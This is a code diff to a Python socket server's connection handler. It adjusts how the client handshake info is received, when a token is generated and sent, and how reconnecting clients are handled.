@@ -114,6 +114,7 @@ The client first sends this information, then the server sends the parameters as
 
 
     def recvUltraSafe(self):
+        data = ""
         self.conn.settimeout(3)
         try:
             data = self.conn.recv(4096).decode("utf8")
@@ -138,7 +139,7 @@ The client first sends this information, then the server sends the parameters as
         list_info = []
         while True:
             data = self.recvUltraSafe()
-            
+            print(data)
             if(data == "\r\n"):
                 print("Stop recvFirstInfo")
                 break
@@ -162,7 +163,7 @@ The client first sends this information, then the server sends the parameters as
                 else:
                     print("dict empty")
             else:       
-                print(data)
+                
                 tmp = data.split("|")
                 list_info.append(tmp[1])
         
@@ -187,10 +188,15 @@ The client first sends this information, then the server sends the parameters as
 
     def run(self):
         
-        token = self.generateToken()
+        
         list_info = self.recvFirstInfo() #Collect informations with Handshake client. #1
-       # print("sencode part persi go !!!! ")
-        self.sendParameterOfClient(token) #2
+        if(bool(list_info)):
+            #print("sencode part persi go !!!! ")
+            token = self.generateToken()
+            self.sendParameterOfClient(token) #2
+        else:
+            #if empty,  ignore. If the list is empty, it means that the client sent a mod_reconnect.
+            pass 
 
         if(bool(list_info)):       
             Handler.dict_conn[Handler.number_conn] = [self.conn, self.address[0],self.address[1], True, list_info[0], list_info[1], list_info[2]] #3 #True = Connexion is life 
